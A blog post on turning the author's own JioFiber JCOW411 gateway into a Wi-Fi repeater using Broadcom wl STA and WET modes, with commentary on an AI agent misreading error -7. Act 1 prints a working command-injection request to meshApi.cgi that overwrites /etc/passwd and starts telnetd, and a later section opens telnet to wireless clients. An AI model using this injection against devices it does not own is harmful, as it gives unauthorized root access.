---
title: "Turning a Locked JioFiber Gateway into a Wireless Repeater (and the Error Code that Fooled an AI)"
date: "2026-09-16"
excerpt: "My agent gained root on a spare JioFiber JCOW411, spent hours in the weeds of closed Broadcom drivers, and concluded a wireless repeater was 'impossible on this hardware'. It wasn't impossible — here is how Broadcom WET mode and a misread error code cracked it wide open."
---

I had a decommissioned JioFiber **JCOW411** ONT/gateway sitting on my desk. It’s solid hardware: a dual-core ARMv7 SoC, Broadcom fullmac Wi-Fi (2.4 GHz 802.11n + 5 GHz 802.11ac VHT80), four Gigabit Ethernet ports, and 128 MB of flash running Linux 4.1.52 with Plume's OpenSync mesh stack.

I don't have Jio fiber service on this box anymore, but I needed a **wireless range extender** for a back room: 5 GHz backhaul to my main router, 2.4 GHz for client devices, transparently bridged on the same subnet so roaming works without double-NAT.

I set an autonomous coding agent loose on the router — specifically **DeepSeek V4.1 (flash model) running through Claude Code**. It got root in under five minutes. Then it spent hours poking around the kernel, drivers, and wireless stack, finally returning with a definitive 200-line markdown postmortem:

> *"Not achievable on this hardware. The chipset is Broadcom fullmac (`dhd`/`wl`), not mac80211... The WPA supplicant path is compiled out... Even rewriting the kernel cannot help."*

It sounded thorough, authoritative, and totally logical.

It was also completely wrong.

Here is the story of how an AI constructed an ironclad proof of impossibility around a single misinterpreted error code, how a second model cracked it wide open with vintage Broadcom SDK knowledge, and how Broadcom’s vintage features turned the locked ISP box into a gigabit wireless bridge.

---

## Act 1: The Root Shell

Before you can repurpose an ISP gateway, you have to own it.

Older community guides for Jio gateways rely on downloading an encrypted configuration backup via the web interface, decrypting it with AES-128-CBC using fixed model keys (`arcadyan...`), injecting Lua scripts into the backup, and restoring it.

On modern firmware (`ARCNTF1_JCOW411_R3.16`, built March 2026), that path is dead. The encryption key is randomly generated per-device on first boot (`/flash/secure/key.txt`), combining the serial number with 32 random hex characters.

Instead, root was gained via an EasyMesh management API command injection (`meshApi.cgi`), referencing the technique documented by [Naitik1208/JF-ROUTER](https://github.com/Naitik1208/JF-ROUTER) on GitHub. Splicing shell commands into the `Threshold_Val` JSON parameter executes directly in a root subshell:

```http
POST /meshApi.cgi?meshApi=1&meshRequest=SET_CGI HTTP/1.1
Host: 192.168.1.250
Content-Type: application/json

{
  "Admin_Name": "admin",
  "Admin_Password": "...",
  "Threshold_Val": ";touch /flash/telnetEnable;echo 'root:HASH:0:0:root:/:/bin/sh' > /etc/passwd;/usr/sbin/telnetd -p 23;"
}
```

A quick HTTP POST, a telnet session on port 23, and we had an interactive BusyBox root shell:

```
Linux RAROTEJE0001102 4.1.52 #2 SMP PREEMPT Thu Mar 12 19:39:39 IST 2026 armv7l
RIL> id
uid=0(root) gid=0(root)
```

Now came the real objective: turning the radios into a wireless repeater.

---

## Act 2: The "Impossible" Verdict

To make a wireless repeater, one radio must act as a **client (STA)** connecting to the upstream Wi-Fi network, while the other radio (or a virtual AP) serves local clients, with both bridged together.

The agent tried the standard modern Linux route: `wpa_supplicant` with the `nl80211` driver.

```bash
wpa_supplicant -B -i wl1 -c /tmp/rsta.conf -D nl80211
```

It failed immediately:
```
wl1: Trying to associate with 20:0c:86:1b:9e:50 (SSID='Upstream' freq=5180 MHz)
wl1: Association request to the driver failed
```

Cranking debug verbosity up to `-dd` revealed the underlying syscall return:
```
nl80211: Connect (ifindex=14)
nl80211: MLME connect failed: ret=-7 (Argument list too long)
```

**`ret=-7`.** In standard Linux userland headers (`errno.h`), error 7 is `#define E2BIG 7` (*"Argument list too long"*).

The agent saw `E2BIG`, checked the Broadcom proprietary tool `wl` as an alternative, and tried enabling the driver-resident supplicant:
```bash
wl -i wl1 infra 1
wl -i wl1 sup_wpa 1
```
Output:
```
wl: Not STA
```

It then inspected the kernel modules in `/lib/modules/4.1.52/`:
```
/proc/modules:
  dhd 776421    (Broadcom Dongle Host Driver — fullmac)
  wl            (Broadcom proprietary wireless driver)
  hnd, emf, igs, wfd, bcmmcast, wlcsm...
```
Out of 70 kernel modules, there was **no `mac80211.ko`** and **no `brcmfmac.ko`**. The only wireless driver was Broadcom’s closed-source fullmac binary blob.

The agent (DeepSeek V4.1 Flash) synthesized this evidence into a clean syllogism:
1. `nl80211 CONNECT` fails at the kernel boundary with `-E2BIG` (rejection of connection attributes).
2. Broadcom's vendor tool rejects `sup_wpa 1` with `Not STA`.
3. The kernel has no `mac80211`, so standard open-source drivers cannot be substituted.
4. *Conclusion:* The vendor compiled station/supplicant support out of the proprietary firmware blob. Repurposing as a wireless repeater is fundamentally impossible.

It was a beautiful diagnostic report. Every test was cited. Every log was saved.

Except for one detail.

---

## Act 3: Enter Gemini 3.8 Flash — Error `-7` Wasn't What It Looked Like

I handed the project and logs over to a second model — **Gemini 3.8 Flash** via Antigravity.

Gemini immediately flagged something that DeepSeek had missed. Why did the kernel return `-7`?

Because Broadcom drivers don't speak Linux errnos when talking to their hardware dongle. Broadcom’s SDK uses its own proprietary error enumeration (`include/bcmutils.h`):

```c
#define BCME_OK           0
#define BCME_ERROR       -1
#define BCME_BADARG      -2
#define BCME_BADOPTION   -3
#define BCME_NOTUP       -4
#define BCME_NOTDOWN     -5
#define BCME_NOTAP       -6
#define BCME_NOTSTA      -7   /* <-- Error -7 is BCME_NOTSTA! */
#define BCME_BADKEYIDX   -8
#define BCME_RADIOOFF    -9
```

**`-7` was not `E2BIG` ("Argument list too long").**
**`-7` was `BCME_NOTSTA` ("Not a Station")!**

The Broadcom driver ioctl returned `-7`, passed it raw through the `cfg80211` compatibility shim back to userland, and userland libc called `strerror(7)`, printing *"Argument list too long"*.

The chip wasn’t rejecting the connection parameters. The chip was literally saying:
> *"Hey, you're asking me to connect as a station, but I am not in station mode!"*

---

## Act 4: The One Missing Command

Why was the radio not a station?

I checked the radio’s operating mode:
```bash
wl -i wl1 ap
```
Output:
```
1
```

`ap` was `1`! The radios on the JCOW411 boot in **Access Point mode**.

The previous agent had run `wl -i wl1 infra 1`. But in Broadcom terminology, `infra 1` merely specifies an Infrastructure BSS network type (as opposed to an Ad-hoc IBSS network). It does **not** change the radio from an AP to a Station.

As long as `ap` was `1`, the radio considered itself an Access Point. Any command asking it to associate, join a network, or enable a client supplicant was rejected with `BCME_NOTSTA` (-7).

What happens if you actually flip the AP switch?

```bash
wl -i wl1 down
wl -i wl1 ap 0        # <-- Put radio into true STA mode
wl -i wl1 up
```

Now test `sup_wpa`:
```bash
wl -i wl1 sup_wpa 1
echo rc=$?
```
Output:
```
rc=0
```

`rc=0`! No error. The driver-resident supplicant initialized instantly.

Next, setting the passphrase:
```bash
wl -i wl1 set_pmk "MySecretPassword"
wl -i wl1 wsec 4         # AES-CCMP
wl -i wl1 wpa_auth 128   # WPA2-PSK
wl -i wl1 join "MyUpstreamWiFi" amode wpa2psk
```

Three seconds later:
```bash
wl -i wl1 status
```
```
SSID: "MyUpstreamWiFi"
Mode: Managed   RSSI: -72 dBm   SNR: 18 dB   Channel: 36/80
BSSID: 20:0C:86:1B:9E:50        Capability: ESS WEP ShortSlot 
RSN (WPA2):
        multicast cipher: AES-CCMP
        unicast ciphers(1): AES-CCMP 
        AKM Suites(1): WPA2-PSK 
VHT Capable:
        Chanspec: 5GHz channel 42 80MHz (0xe02a)
        Supported VHT MCS: NSS1: 0-9, NSS2: 0-9
```

BSSID matched the upstream gateway's real MAC. It had negotiated an 80 MHz VHT connection with dual spatial streams.

Running DHCP client:
```bash
udhcpc -i wl1 -n -q
```
```
udhcpc: lease of 192.168.1.7 obtained, lease time 86403
```
Packets were flowing. Pinging the upstream gateway returned `4.5 ms`.

The "impossible" station mode was working with stock drivers.

---

## Act 5: Bridging the Unbridgeable (`wl wet 1`)

Now came the second hurdle that traditional Linux networking documentation warns you about: **Layer-2 bridging**.

In standard 802.11 Wi-Fi, a station communicates using 3-address frames (`Destination`, `Source`, `BSSID`). If you put a station interface into a standard Linux bridge (`brctl addif br0 wl1`), client packets behind the repeater retain their original MAC addresses. The upstream AP drops them because it only expects frames with the station’s authenticated MAC address.

Normally, solving this requires:
1. **4-Address WDS mode** (requires upstream router support, rarely compatible across vendors), or
2. **`relayd`** (pseudo-bridge daemon that runs proxy-ARP in userland), or
3. **Double-NAT** (routed mode, breaking seamless LAN access and local discovery).

The JCOW411 had no 4-address mode and no `relayd`.

Enter Broadcom’s secret weapon from the WRT54G era: **WET (Wireless Ethernet Transport)**.

Broadcom chipsets have native client-bridge support built directly into their driver. Running:
```bash
wl -i wl1 wet 1
```
enables driver-level Layer-2 MAC translation and proxy-ARP. The driver rewrites outgoing frames to use the station's MAC while transparently tracking return flows and re-mapping them back to the downstream client MACs.

With `wet 1` enabled, `wl1` can simply be attached directly to the gateway’s existing LAN bridge (`bdg2`):

```bash
brctl addif bdg2 wl1
ip route replace default via 192.168.1.1 dev bdg2
```

The result:
- The four Gigabit Ethernet ports on the router (`eth0`–`eth3`) are bridged into `bdg2`.
- The 2.4 GHz AP (`wl0.2`, running hostapd on Channel 1) is bridged into `bdg2`.
- The 5 GHz backhaul (`wl1`) bridges `bdg2` over the air to the main router.
- **Every device receives an IP on the same `192.168.1.0/24` subnet directly from the main router's DHCP server.**

---

## Act 6: Persistence & Self-Healing

The final step was making it survive power cycles without intervention.

The router runs OpenSync (Plume), whose Wireless Manager (`wm`) daemon tries to push mesh configurations from the cloud and reset radio settings. We disabled `wm` in OpenSync's OVSDB database so it never interferes:

```bash
ovsh u Node_Services -w service==wm enable:=false
```

Then we deployed a small, self-contained repeater daemon (`/usr/sbin/jf_repeater`) with a SysV init script (`/etc/init.d/repeater`), symlinked into runlevel 3 (`/etc/rc3.d/S99z_repeater`):

```sh
#!/bin/sh
# /usr/sbin/jf_repeater

trap '' HUP

BACKHAUL="wl1"
SSID="MyUpstreamWiFi"
PSK="MySecretPassword"
GATEWAY="192.168.1.1"
BRIDGE="bdg2"

setup_backhaul() {
    killall -9 wm 2>/dev/null
    wl -i "$BACKHAUL" down
    wl -i "$BACKHAUL" ap 0
    wl -i "$BACKHAUL" infra 1
    wl -i "$BACKHAUL" wet 1
    wl -i "$BACKHAUL" sup_wpa 1
    wl -i "$BACKHAUL" set_pmk "$PSK"
    wl -i "$BACKHAUL" wsec 4
    wl -i "$BACKHAUL" wpa_auth 128
    wl -i "$BACKHAUL" up
    wl -i "$BACKHAUL" join "$SSID" amode wpa2psk
    sleep 4
}

# Initial bringup
setup_backhaul
brctl addif "$BRIDGE" "$BACKHAUL" 2>/dev/null
ip route replace default via "$GATEWAY" dev "$BRIDGE"
echo "nameserver $GATEWAY" > /etc/resolv.conf

# Self-healing monitor loop
while true; do
    sleep 15
    bssid=$(wl -i "$BACKHAUL" bssid 2>/dev/null)
    if [ -z "$bssid" ] || [ "$bssid" = "00:00:00:00:00:00" ]; then
        setup_backhaul
    fi
    if ! brctl show "$BRIDGE" | grep -q "$BACKHAUL"; then
        brctl addif "$BRIDGE" "$BACKHAUL" 2>/dev/null
    fi
    if ! ip route show | grep -q "default via $GATEWAY"; then
        ip route replace default via "$GATEWAY" dev "$BRIDGE"
    fi
done
```

Because `/` is an active read-write UBIFS filesystem on flash, the init script and configs survive cold boots.

---

## Results & Verification

Plugging a laptop into the router’s LAN port 1 over Ethernet:

```bash
$ ping 192.168.1.1
64 bytes from 192.168.1.1: icmp_seq=1 ttl=64 time=4.33 ms
64 bytes from 192.168.1.1: icmp_seq=2 ttl=64 time=5.46 ms

--- 192.168.1.1 ping statistics ---
0% packet loss, rtt min/avg/max = 4.332/4.898/5.464 ms

$ ping google.com
64 bytes from 142.251.126.100: icmp_seq=1 ttl=113 time=7.31 ms
64 bytes from 142.251.126.100: icmp_seq=2 ttl=113 time=7.65 ms

--- google.com ping statistics ---
0% packet loss, rtt min/avg/max = 7.315/7.485/7.656 ms
```

Scanning Wi-Fi from client devices shows the 2.4 GHz AP (`Jio5G-Hathway`) beaconing at 100% signal strength. Connecting to it yields a seamless DHCP lease from the upstream router, zero double-NAT, and full throughput across the 80 MHz 5 GHz backhaul.

### Bonus: Wireless Telnet and the Firewall Trap

Once the router was unplugged from Ethernet and moved across the house into its repeater position, one final quirk appeared: attempting to telnet into `192.168.1.250` wirelessly timed out. Web management on port 80 worked fine, and ping times were under 2 ms, but port 23 was filtered.

Inspecting iptables on the router revealed why:
```
Chain fwInBypass:
ACCEPT  tcp -- * * 0.0.0.0/0 0.0.0.0/0 tcp dpt:23 src-group 0x1/0x1
```
The gateway's TeamF1 firewall restricted inbound telnet specifically to `ifgroup 0x1/0x1` — the physical wired Ethernet ports. Connections from wireless client VAPs (`wl0.2`) were dropped.

Poking a bypass rule unlocked wireless administration:
```bash
/pfrm2.0/bin/iptables -I fwInBypass 1 -p tcp --dport 23 -j ACCEPT
```
We baked this rule directly into `/etc/init.d/repeater` and `/flash/jf_repeater.sh` so wireless root access is always available immediately after boot.

### The Cold-Boot "Ghost" and the OpenSync Watchdog Loop

Everything seemed done until the router was power-cycled.

On a fresh cold boot, a bizarre behavior surfaced: the repeater AP SSID would show up for roughly fifteen seconds, allow a client to connect, and then abruptly vanish into thin air. Thirty seconds later, it reappeared, only to drop again in an endless tug of war.

Digging through running processes with `ps` exposed the hidden antagonist:
```
PID 1473:  /bin/sh /usr/opensync/scripts/healthcheck.service
PID 12639: /bin/sh /usr/opensync/bin/restart.sh
PID 14258: /bin/sh /etc/init.d/opensync start
```

Jio's firmware integrates Plume OpenSync. In factory operation, OpenSync talks to Plume’s cloud servers. Because the router was now an offline repeater:
1. `healthcheck.service` repeatedly failed its connectivity tests.
2. `libopensync.so` triggered `/usr/opensync/bin/restart.sh`.
3. `restart.sh` executed `/etc/init.d/opensync restart`.
4. In `/etc/init.d/opensync`, the script issued `wlconf wl0 down; wlconf wl0 up; wlconf wl0 start` and the same for `wl1`.

Every 30 to 60 seconds, OpenSync was completely tearing down the Broadcom radios and resetting them, destroying our station association and killing the client AP!

Compounding the problem, `hostapd` is started at boot with an empty configuration (`hostapd -g /var/run/hostapd/global`), originally relying on OpenSync's `wm` daemon to dynamically add BSS configurations. Without OpenSync, `wl0.2` was never registered to hostapd after reboot.

Finally, an obnoxious vendor alarm script (`/pfrm2.0/bin/script.sh`) was running every 10 seconds, polling for an optical GPON signal. Seeing none, it continually touched `/tmp/gponFailed` and forced the gateway's status LED into a frantic fast-blinking red loop (`/bin/ledctl1 RED fastBlink`).

#### The Final Lockdown

To make the repeater genuinely persistent and "just work" across cold reboots:

1. **Neutered OpenSync Watchdogs**: Replaced `/usr/opensync/bin/restart.sh` and `/etc/init.d/healthcheck` with clean no-op scripts (`exit 0`) and removed `/etc/rc3.d/S991healthcheck`. In `/etc/init.d/opensync`, preserved the Broadcom hardware VIF initialization while permanently disabling the OpenSync manager daemons (`dm`, `start.sh`, `ipmond`, `gwofflinemond`, `ovsmond`).
2. **Autonomous Hostapd Control**: Equipped `/usr/sbin/jf_repeater` with direct control over hostapd's global socket:
   ```bash
   hostapd_cli -p /var/run/hostapd raw "ADD bss_config=wl0:/var/run/hostapd-wl0.2.config"
   ```
   If either the backhaul or the AP interface ever drops, the daemon automatically re-associates and recovers the link within 10 seconds.
3. **Silenced Fiber Alarms & Solid Green LED**: Appended `exit 0` at line 2 of `/pfrm2.0/bin/script.sh` (persisted across boots on read-write UBIFS), and programmed `jf_repeater` to maintain a calm, solid green status LED (`/bin/ledctl green on`).

A full cold reboot confirmed the victory: from power-on, the gateway initializes in under 20 seconds, connects the 5 GHz backhaul, broadcasts the 2.4 GHz AP, bridges all traffic to the LAN, turns solid green, and runs indefinitely with zero drops.

---

## Reflections: When AI Debugging Hits Abstraction Leaks


This was a fascinating real-world benchmark of autonomous agents tackling embedded systems.

**DeepSeek V4.1 Flash** (running in Claude Code) was extraordinarily thorough: it gained root in minutes, automated test scripts, collected kernel logs, and methodically tested options. It didn't hallucinate or get lazy. But it fell victim to an **abstraction leak**:
1. It trusted `strerror(7)` without realizing that Broadcom's kernel driver ioctl returns negative vendor error codes that pass through userland untranslated.
2. It treated `Argument list too long` as ground truth, poisoning its entire hypothesis tree.
3. Every subsequent failure (`sup_wpa`, `set_pmk`, `mac80211` checks) seemed to confirm the false premise that station mode was compiled out.

**Gemini 3.8 Flash** (running in Antigravity) brought the broader domain knowledge needed to break out of the loop. Having extensive pre-training on embedded networking and vendor SDKs, Gemini recognized that `-7` was Broadcom's `#define BCME_NOTSTA -7` (`Not a Station`), realized the radio was simply in AP mode (`ap 1`), and reached for vintage Broadcom WET mode (`wl wet 1`) to bridge Layer 2 without double-NAT.

It’s a clear demonstration of where AI models are today: rigorous logical deduction gets an agent very far, but domain-specific ground truth is what ultimately separates an "impossible" verdict from a working solution.

---

## Repositories & Resources

The complete repeater daemon, init service, and one-click installer are open-sourced for the community:

- **GitHub Repository:** [**amanmprojects/jcow411-repeater**](https://github.com/amanmprojects/jcow411-repeater)
- **Direct Installer (run inside router shell):**
  ```sh
  /pfrm2.0/bin/curl -sSL https://raw.githubusercontent.com/amanmprojects/jcow411-repeater/main/install.sh | sh -s -- "YOUR_SSID" "YOUR_PASSWORD"
  ```
- **Root Exploit Reference:** [Naitik1208/JF-ROUTER](https://github.com/Naitik1208/JF-ROUTER)

